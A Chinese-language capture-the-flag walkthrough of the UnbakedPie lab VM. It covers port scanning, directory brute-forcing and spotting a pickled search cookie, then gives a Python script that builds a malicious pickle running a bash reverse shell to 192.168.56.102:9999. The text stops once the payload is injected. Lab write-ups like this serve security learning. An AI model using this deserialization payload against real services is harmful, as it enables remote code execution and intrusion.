# UnbakedPie

:::note

[Linux VM] [Tested on VirtualBox] created by || ch4rm

⏲️ Release Date // 2020-10-06

✔️ MD5 // 92707e4a6a76dbd738ef2dbe716fcf7c

☠ Root // 31

💀 User // 31

📝Notes //
Requires pivotting and owasp skills. Real life scenarios + a few ctf privesc. Made by ch4rm (@aniqfakhrul) & h0j3n (@h0j3n).

:::

## 靶机启动

靶机 IP

```plaintext
192.168.56.119
```

## nmap 信息搜集

```plaintext
Nmap scan report for 192.168.56.119
Host is up (0.00051s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
5003/tcp open  filemaker?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Date: Fri, 23 Feb 2024 07:34:15 GMT
|     Server: WSGIServer/0.2 CPython/3.8.6
|     Content-Type: text/html; charset=utf-8
|     X-Frame-Options: DENY
|     Vary: Cookie
|     Content-Length: 7453
|     X-Content-Type-Options: nosniff
|     Referrer-Policy: same-origin
|     Set-Cookie: csrftoken=wTXfC78Rn0Mg5kXVjEgMPcru1ulwDoVy9t17wj5RmELJZElX5xkCYhkdB4HvTGmw; expires=Fri, 21 Feb 2025 07:34:15 GMT; Max-Age=31449600; Path=/; SameSite=Lax
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
|     <meta name="description" content="">
|     <meta name="author" content="">
|     <title>[Un]baked | /</title>
|     <!-- Bootstrap core CSS -->
|     <link href="/static/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
|     <!-- Custom fonts for this template -->
|     <link href="/static/vendor/fontawesome-free/css/all.min.cs
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     Date: Fri, 23 Feb 2024 07:34:16 GMT
|     Server: WSGIServer/0.2 CPython/3.8.6
|     Content-Type: text/html; charset=utf-8
|     X-Frame-Options: DENY
|     Vary: Cookie
|     Content-Length: 7453
|     X-Content-Type-Options: nosniff
|     Referrer-Policy: same-origin
|     Set-Cookie: csrftoken=r9a0Ot8xvhGgew8qiA5FC2X1Cgl2eiHHtB3YQizhqbxB1owpT998WDNvFlyn5HCf; expires=Fri, 21 Feb 2025 07:34:16 GMT; Max-Age=31449600; Path=/; SameSite=Lax
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
|     <meta name="description" content="">
|     <meta name="author" content="">
|     <title>[Un]baked | /</title>
|     <!-- Bootstrap core CSS -->
|     <link href="/static/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
|     <!-- Custom fonts for this template -->
|_    <link href="/static/vendor/fontawesome-free/css/all.min.cs
```

## web 服务

![img](img/image_20240211-231132.png)

尝试进行目录爆破

```plaintext
[23:12:47] 200 -    5KB - /about
[23:12:50] 301 -    0B  - /accounts/login  ->  /accounts/login/
[23:12:58] 302 -    0B  - /admin/?/login  ->  /admin/login/?next=/admin/%3F/login
[23:12:58] 302 -    0B  - /admin/  ->  /admin/login/?next=/admin/
[23:12:59] 301 -    0B  - /admin/login  ->  /admin/login/
......
```

未得到有效信息

### 与搜索功能进行交互

在尝试使用搜索功能时，使用 `test` 作为关键词进行搜索，发现本地 Cookie 储存中出现

```plaintext
"gASVCAAAAAAAAACMBHRlc3SULg=="
```

并发现以下返回数据包

```plaintext
HTTP/1.1 200 OK
Date: Fri, 23 Feb 2024 13:00:51 GMT
Server: WSGIServer/0.2 CPython/3.8.6
Content-Type: text/html; charset=utf-8
X-Frame-Options: DENY
Vary: Cookie
Content-Length: 4881
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Set-Cookie:  search_cookie="gASVCAAAAAAAAACMBHRlc3SULg=="; Path=/
Set-Cookie:  csrftoken=jywYAtaiwPVi0GDpUy243peCMIR3LVPtW5OTnzKTrPxgMWN02CyGeW5NKWKNOiUE; expires=Fri, 21 Feb 2025 13:00:51 GMT; Max-Age=31449600; Path=/; SameSite=Lax
```

产生进行解码

```python
import base64
import pickle

s = "gASVCAAAAAAAAACMBHRlc3SULg=="

s = pickle.loads(base64.b64decode(s))

print(s)
# test
```

可以确定远程服务存在 Python Pickle 序列化相关操作，尝试利用

### 生成反序列化恶意载荷

```python
import pickle, base64, os

create_shell_command = lambda: (os.system, ("bash -i>& /dev/tcp/192.168.56.102/9999 0>&1",))

print(base64.urlsafe_b64encode(pickle.dumps(create_shell_command())).decode())
# gASVRAAAAAAAAACMAm50lIwGc3lzdGVtlJOUjCxiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNTYuMTAyLzk5OTkgMD4mMZSFlIaULg==
```

将这个生成的恶意载荷投入浏览会话中，进行交互
